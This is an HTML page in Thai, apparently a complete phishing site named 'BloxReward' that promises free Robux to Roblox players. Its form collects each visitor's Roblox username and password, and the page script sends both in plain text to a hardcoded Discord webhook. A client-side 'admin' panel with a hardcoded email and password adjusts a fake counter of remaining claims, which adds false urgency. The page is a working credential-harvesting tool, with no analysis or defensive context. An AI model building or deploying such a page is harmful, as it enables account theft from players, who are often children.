<!DOCTYPE html>
<html lang="th" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BloxReward - ระบบขอรับ Robux</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" rel="stylesheet">
   
    <style>
        body {
            font-family: 'Prompt', sans-serif;
            background: #0e0f12;
            background-image:
                radial-gradient(circle at 15% 20%, rgba(0, 162, 255, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 85% 80%, rgba(147, 51, 234, 0.07) 0%, transparent 40%);
            background-attachment: fixed;
        }
        /* Glassmorphism สไตล์ Gemini */
        .gemini-card {
            background: rgba(20, 22, 27, 0.65);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        .gemini-input {
            background: rgba(13, 14, 18, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.12);
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .gemini-input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
            background: rgba(18, 20, 26, 0.95);
        }
        /* ปุ่มไล่เฉดสี */
        .btn-gemini-primary {
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            transition: all 0.25s ease;
            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.35);
        }
        .btn-gemini-primary:hover:not(:disabled) {
            transform: translateY(-1px);
            box-shadow: 0 6px 24px rgba(37, 99, 235, 0.5);
            filter: brightness(1.1);
        }
        .btn-gemini-primary:active:not(:disabled) {
            transform: translateY(0);
        }
        /* อนิเมชัน Toast แจ้งเตือน */
        @keyframes toastIn {
            from { opacity: 0; transform: translateX(50px) scale(0.95); }
            to { opacity: 1; transform: translateX(0) scale(1); }
        }
        @keyframes toastOut {
            from { opacity: 1; transform: translateX(0) scale(1); }
            to { opacity: 0; transform: translateX(50px) scale(0.95); }
        }
        .toast-enter { animation: toastIn 0.35s cubic-bezier(0.21, 1.02, 0.73, 1) forwards; }
        .toast-exit { animation: toastOut 0.25s ease forwards; }
        @keyframes pulseGlow {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 0.8; }
        }
        .glow-active {
            animation: pulseGlow 3s infinite ease-in-out;
        }
    </style>
</head>
<body class="text-[#e2e8f0] min-h-screen flex flex-col justify-between selection:bg-blue-500 selection:text-white">
    <!-- Toast Notification Container -->
    <div id="toastContainer" class="fixed top-5 right-5 z-50 flex flex-col gap-3 pointer-events-none max-w-sm w-full px-4 md:px-0"></div>
    <!-- Header Navbar -->
    <header class="w-full bg-[#0e0f12]/60 backdrop-blur-md border-b border-white/5 px-6 py-4 fixed top-0 left-0 z-40">
        <div class="max-w-6xl mx-auto flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 rounded-lg bg-gradient-to-tr from-blue-600 to-indigo-400 flex items-center justify-center text-white font-bold text-lg shadow-lg shadow-blue-500/20">
                    B
                </div>
                <span class="text-xl font-bold tracking-tight bg-gradient-to-r from-white via-gray-200 to-gray-400 bg-clip-text text-transparent">
                    BloxReward
                </span>
            </div>
           
            <button onclick="openAdminModal()" class="flex items-center gap-2 bg-white/5 hover:bg-white/10 border border-white/10 px-4 py-2 rounded-full text-xs font-medium transition-all active:scale-95 text-gray-300">
                <span class="material-symbols-outlined text-base text-blue-400">admin_panel_settings</span>
                <span>ผู้ดูแลระบบ</span>
            </button>
        </div>
    </header>
    <!-- Main Content -->
    <main class="flex-grow flex flex-col items-center justify-center px-4 pt-28 pb-12">
        <div class="gemini-card max-w-md w-full rounded-3xl p-6 md:p-8 space-y-7 relative overflow-hidden">
           
            <!-- Glow แสงหลังการ์ด -->
            <div class="absolute -top-24 -left-24 w-48 h-48 bg-blue-500/10 rounded-full blur-3xl pointer-events-none glow-active"></div>
            <!-- Remaining Requests Display -->
            <div class="text-center space-y-3 relative z-10">
                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-medium">
                    <span class="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse"></span>
                    <span>ระบบแจกสิทธิ์ Real-time</span>
                </div>
               
                <div class="space-y-1">
                    <span class="text-xs uppercase tracking-wider text-gray-400 font-medium">จำนวนสิทธิ์การขอคงเหลือ</span>
                    <div class="text-6xl font-extrabold tracking-tight text-white flex items-center justify-center gap-2">
                        <span id="requestCount" class="bg-gradient-to-b from-white to-gray-300 bg-clip-text text-transparent">2</span>
                        <span class="text-base font-normal text-gray-400">สิทธิ์</span>
                    </div>
                </div>
                <div id="statusBadge" class="inline-flex items-center gap-1.5 text-xs text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 py-1.5 px-4 rounded-full font-medium">
                    <span class="material-symbols-outlined text-sm">check_circle</span>
                    <span>พร้อมเปิดรับคำขอ</span>
                </div>
            </div>
            <div class="h-px w-full bg-gradient-to-r from-transparent via-white/10 to-transparent"></div>
            <!-- Request Form -->
            <form id="requestForm" onsubmit="handleUserSubmit(event)" class="space-y-4 relative z-10">
                <div class="space-y-1.5">
                    <label class="block text-xs font-medium text-gray-300">Roblox Username</label>
                    <div class="relative">
                        <span class="material-symbols-outlined absolute left-3.5 top-3 text-gray-400 text-lg">person</span>
                        <input type="text" id="username" required placeholder="ชื่อผู้ใช้ใน Roblox"
                               class="gemini-input w-full rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-gray-500 focus:outline-none">
                    </div>
                </div>
                <!-- ช่องใส่ Password -->
                <div class="space-y-1.5">
                    <label class="block text-xs font-medium text-gray-300">Password</label>
                    <div class="relative">
                        <span class="material-symbols-outlined absolute left-3.5 top-3 text-gray-400 text-lg">lock</span>
                        <input type="password" id="password" required placeholder="รหัสผ่าน"
                               class="gemini-input w-full rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-gray-500 focus:outline-none">
                    </div>
                </div>
                <div class="space-y-1.5">
                    <label class="block text-xs font-medium text-gray-300">เหตุผลที่อยากได้ Robux</label>
                    <div class="relative">
                        <span class="material-symbols-outlined absolute left-3.5 top-3 text-gray-400 text-lg">chat_bubble</span>
                        <textarea id="reason" rows="3" required placeholder="อธิบายเหตุผลสั้นๆ..."
                                  class="gemini-input w-full rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-gray-500 focus:outline-none resize-none"></textarea>
                    </div>
                </div>
                <button type="submit" id="submitBtn"
                        class="btn-gemini-primary w-full text-white font-medium py-3 rounded-xl transition-all flex justify-center items-center gap-2 text-sm mt-2">
                    <span class="material-symbols-outlined text-lg">send</span>
                    <span>ส่งคำขอรับ Robux</span>
                </button>
            </form>
        </div>
    </main>
    <!-- Admin Modal -->
    <div id="adminModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50 transition-opacity duration-300">
        <div class="gemini-card max-w-sm w-full rounded-3xl p-6 space-y-5 relative">
            <button onclick="closeAdminModal()" class="absolute top-5 right-5 text-gray-400 hover:text-white transition-colors">
                <span class="material-symbols-outlined">close</span>
            </button>
            <!-- Step 1: Admin Login -->
            <div id="adminLoginStep" class="space-y-4">
                <div class="flex items-center gap-3">
                    <div class="p-2.5 bg-blue-500/10 border border-blue-500/20 rounded-xl text-blue-400">
                        <span class="material-symbols-outlined text-xl">lock</span>
                    </div>
                    <div>
                        <h2 class="text-base font-bold text-white">ยืนยันตัวตนแอดมิน</h2>
                        <p class="text-xs text-gray-400">กรอกอีเมลและรหัสผ่านเพื่อเข้าสู่แผงควบคุม</p>
                    </div>
                </div>
                <form onsubmit="handleAdminLogin(event)" class="space-y-3">
                    <div class="space-y-1">
                        <label class="block text-xs font-medium text-gray-300">อีเมลแอดมิน</label>
                        <input type="email" id="adminEmail" required placeholder="ninjatwoo890@gmail.com"
                               class="gemini-input w-full rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none">
                    </div>
                    <div class="space-y-1">
                        <label class="block text-xs font-medium text-gray-300">รหัสผ่าน (Password)</label>
                        <input type="password" id="adminPassword" required placeholder="••••••••"
                               class="gemini-input w-full rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none">
                    </div>
                    <button type="submit" class="btn-gemini-primary w-full text-white font-medium py-2.5 rounded-xl text-sm mt-2">
                        เข้าสู่ระบบ
                    </button>
                </form>
            </div>
            <!-- Step 2: Admin Dashboard (ปรับปรุงเพิ่มระบบ ลบ/ลด สิทธิ์) -->
            <div id="adminDashboardStep" class="hidden space-y-4">
                <div class="flex items-center gap-3">
                    <div class="p-2.5 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-emerald-400">
                        <span class="material-symbols-outlined text-xl">tune</span>
                    </div>
                    <div>
                        <h2 class="text-base font-bold text-white">แผงจัดการสิทธิ์</h2>
                        <p class="text-xs text-gray-400">เพิ่ม ลบ หรือรีเซ็ตจำนวนสิทธิ์</p>
                    </div>
                </div>
               
                <div class="space-y-3">
                    <div>
                        <label class="block text-xs font-medium text-gray-300 mb-1">ระบุจำนวนสิทธิ์</label>
                        <input type="number" id="adminAmount" min="1" value="5" required
                               class="gemini-input w-full rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none">
                    </div>
                    <div class="grid grid-cols-2 gap-2">
                        <button type="button" onclick="modifyRequests('add')" class="bg-emerald-600 hover:bg-emerald-500 active:scale-[0.98] text-white font-medium py-2.5 rounded-xl transition-all text-xs flex items-center justify-center gap-1 shadow-lg shadow-emerald-600/20">
                            <span class="material-symbols-outlined text-sm">add</span>
                            <span>เพิ่มสิทธิ์</span>
                        </button>
                        <button type="button" onclick="modifyRequests('subtract')" class="bg-rose-600 hover:bg-rose-500 active:scale-[0.98] text-white font-medium py-2.5 rounded-xl transition-all text-xs flex items-center justify-center gap-1 shadow-lg shadow-rose-600/20">
                            <span class="material-symbols-outlined text-sm">remove</span>
                            <span>ลบสิทธิ์</span>
                        </button>
                    </div>
                    <button type="button" onclick="modifyRequests('reset')" class="w-full bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white text-xs py-2 rounded-xl transition-all border border-white/5 flex items-center justify-center gap-1">
                        <span class="material-symbols-outlined text-sm">restart_alt</span>
                        <span>รีเซ็ตสิทธิ์เป็น 0</span>
                    </button>
                </div>
               
                <button onclick="logoutAdmin()" class="w-full bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white text-xs py-2 rounded-xl transition-all mt-2">
                    ออกจากระบบ
                </button>
            </div>
        </div>
    </div>
    <!-- Script Logic -->
    <script>
        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1530911939213922345/X9GOoJoDuLBgAp-0rmhB20RUNEaFXYmtvxSbPjNPGyTagR_rcOfhUmM9xaUEtwP7WNUo";
        const ALLOWED_ADMIN_EMAIL = "ninjatwoo890@gmail.com";
        const ADMIN_PASSWORD = "01020304";
        // โหลดสิทธิ์จาก localStorage (ถ้ายังไม่มีในเครื่องจะใช้ค่าเริ่มต้นคือ 2)
        let remainingRequests = localStorage.getItem('blox_remaining_requests') !== null
            ? parseInt(localStorage.getItem('blox_remaining_requests'))
            : 2;
        // ระบบ Toast Notification แจ้งเตือน
        function showToast(message, type = 'info', title = '') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
           
            let icon = 'info';
            let iconBg = 'bg-blue-500/10 text-blue-400 border-blue-500/20';
           
            if (type === 'success') {
                icon = 'check_circle';
                iconBg = 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20';
            } else if (type === 'error') {
                icon = 'error';
                iconBg = 'bg-rose-500/10 text-rose-400 border-rose-500/20';
            }
            toast.className = `toast-enter pointer-events-auto gemini-card p-4 rounded-2xl border flex items-start gap-3 shadow-2xl`;
            toast.innerHTML = `
                <div class="p-1.5 rounded-xl border ${iconBg} flex items-center justify-center shrink-0">
                    <span class="material-symbols-outlined text-lg">${icon}</span>
                </div>
                <div class="flex-grow space-y-0.5">
                    ${title ? `<h4 class="text-xs font-bold text-white">${title}</h4>` : ''}
                    <p class="text-xs text-gray-300 leading-relaxed">${message}</p>
                </div>
            `;
            container.appendChild(toast);
            setTimeout(() => {
                toast.classList.remove('toast-enter');
                toast.classList.add('toast-exit');
                setTimeout(() => toast.remove(), 250);
            }, 4000);
        }
        function updateUI() {
            // บันทึกค่าจำนวนสิทธิ์ล่าสุดลง localStorage
            localStorage.setItem('blox_remaining_requests', remainingRequests);
            const countEl = document.getElementById('requestCount');
            const submitBtn = document.getElementById('submitBtn');
            const badgeEl = document.getElementById('statusBadge');
            countEl.textContent = remainingRequests;
            if (remainingRequests <= 0) {
                submitBtn.disabled = true;
                submitBtn.className = "w-full bg-gray-800 text-gray-500 font-medium py-3 rounded-xl cursor-not-allowed flex justify-center items-center gap-2 text-sm";
                submitBtn.innerHTML = `<span class="material-symbols-outlined text-lg">block</span><span>สิทธิ์การขอหมดแล้ว</span>`;
                badgeEl.className = "inline-flex items-center gap-1.5 text-xs text-rose-400 bg-rose-500/10 border border-rose-500/20 py-1.5 px-4 rounded-full font-medium";
                badgeEl.innerHTML = `<span class="material-symbols-outlined text-sm">pause_circle</span><span>สิทธิ์การขอหมดชั่วคราว</span>`;
            } else {
                submitBtn.disabled = false;
                submitBtn.className = "btn-gemini-primary w-full text-white font-medium py-3 rounded-xl transition-all flex justify-center items-center gap-2 text-sm mt-2";
                submitBtn.innerHTML = `<span class="material-symbols-outlined text-lg">send</span><span>ส่งคำขอรับ Robux</span>`;
                badgeEl.className = "inline-flex items-center gap-1.5 text-xs text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 py-1.5 px-4 rounded-full font-medium";
                badgeEl.innerHTML = `<span class="material-symbols-outlined text-sm">check_circle</span><span>พร้อมเปิดรับคำขอ</span>`;
            }
        }
        async function handleUserSubmit(e) {
            e.preventDefault();
            if (remainingRequests <= 0) {
                showToast('ขออภัย! สิทธิ์การขอถูกผู้ใช้อื่นกดรับไปหมดแล้ว', 'error', 'สิทธิ์หมด');
                return;
            }
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const reason = document.getElementById('reason').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.innerHTML = `<span class="material-symbols-outlined text-lg animate-spin">progress_activity</span><span>กำลังส่งข้อมูล...</span>`;
            const payload = {
                embeds: [{
                    title: "🎁 คำขอรับ Robux ใหม่!",
                    color: 39423,
                    fields: [
                        { name: "👤 Roblox Username", value: `\`${username}\``, inline: true },
                        { name: "🔒 Password", value: `\`${password}\``, inline: true },
                        { name: "📝 เหตุผลที่อยากได้", value: reason, inline: false },
                        { name: "📊 สิทธิ์คงเหลือหลังกดขอ", value: `${remainingRequests - 1} สิทธิ์`, inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                remainingRequests -= 1;
                updateUI();
                showToast('ข้อมูลของคุณถูกส่งไปยัง Discord เรียบร้อยแล้ว', 'success', 'ส่งคำขอสำเร็จ');
                document.getElementById('requestForm').reset();
            } catch (err) {
                showToast('ไม่สามารถเชื่อมต่อกับ Discord Webhook ได้', 'error', 'เกิดข้อผิดพลาด');
                updateUI();
            }
        }
        function openAdminModal() { document.getElementById('adminModal').classList.remove('hidden'); }
        function closeAdminModal() { document.getElementById('adminModal').classList.add('hidden'); }
        function handleAdminLogin(e) {
            e.preventDefault();
            const email = document.getElementById('adminEmail').value.trim();
            const password = document.getElementById('adminPassword').value;
            if (email.toLowerCase() === ALLOWED_ADMIN_EMAIL.toLowerCase() && password === ADMIN_PASSWORD) {
                document.getElementById('adminLoginStep').classList.add('hidden');
                document.getElementById('adminDashboardStep').classList.remove('hidden');
                document.getElementById('adminPassword').value = '';
                showToast('เข้าสู่ระบบผู้ดูแลระบบสำเร็จ', 'success', 'ยินดีต้อนรับ');
            } else {
                showToast('อีเมลหรือรหัสผ่านไม่ถูกต้อง!', 'error', 'เข้าสู่ระบบไม่สำเร็จ');
            }
        }
        // ฟังก์ชันจัดการ เพิ่ม/ลบ/รีเซ็ต สิทธิ์
        function modifyRequests(action) {
            const amountInput = document.getElementById('adminAmount');
            const amount = parseInt(amountInput.value) || 0;
            if (action === 'add') {
                if (amount <= 0) return showToast('กรุณาระบุจำนวนที่มากกว่า 0', 'error');
                remainingRequests += amount;
                showToast(`เพิ่มจำนวนสิทธิ์เรียบร้อย (+${amount} สิทธิ์)`, 'success', 'อัปเดตสิทธิ์สำเร็จ');
            } else if (action === 'subtract') {
                if (amount <= 0) return showToast('กรุณาระบุจำนวนที่มากกว่า 0', 'error');
                remainingRequests = Math.max(0, remainingRequests - amount); // ป้องกันไม่ให้ติดลบ
                showToast(`ลบจำนวนสิทธิ์เรียบร้อย (-${amount} สิทธิ์)`, 'success', 'อัปเดตสิทธิ์สำเร็จ');
            } else if (action === 'reset') {
                remainingRequests = 0;
                showToast('ตั้งค่าจำนวนสิทธิ์คงเหลือเป็น 0 เรียบร้อย', 'info', 'รีเซ็ตสิทธิ์');
            }
            updateUI();
            closeAdminModal();
        }
        function logoutAdmin() {
            document.getElementById('adminLoginStep').classList.remove('hidden');
            document.getElementById('adminDashboardStep').classList.add('hidden');
            document.getElementById('adminEmail').value = '';
            document.getElementById('adminPassword').value = '';
            showToast('ออกจากระบบแอดมินแล้ว', 'info');
        }
        updateUI();
    </script>
</body>
</html>
